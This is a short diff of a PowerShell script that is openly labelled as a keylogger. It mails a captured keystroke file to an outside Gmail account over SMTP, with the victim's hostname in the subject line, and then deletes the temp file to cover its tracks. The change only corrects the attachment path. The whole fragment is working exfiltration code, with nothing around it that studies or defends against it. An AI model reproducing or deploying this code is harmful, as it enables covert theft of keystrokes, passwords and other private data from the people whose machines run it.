@@ -6,6 +6,6 @@ $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'pruebapoloa@gmail.com'
 $ReportEmail.To.Add('pruebapoloa@gmail.com')
 $ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
-$ReportEmail.Attachments.Add("$ENV:temp\test\testing123.txt");$SMTPInfo.Send($ReportEmail);
+$ReportEmail.Attachments.Add("$ENV:temp\testing123.txt");$SMTPInfo.Send($ReportEmail);
 timeout 10
 Remove-Item "$env:temp\testing123.txt"
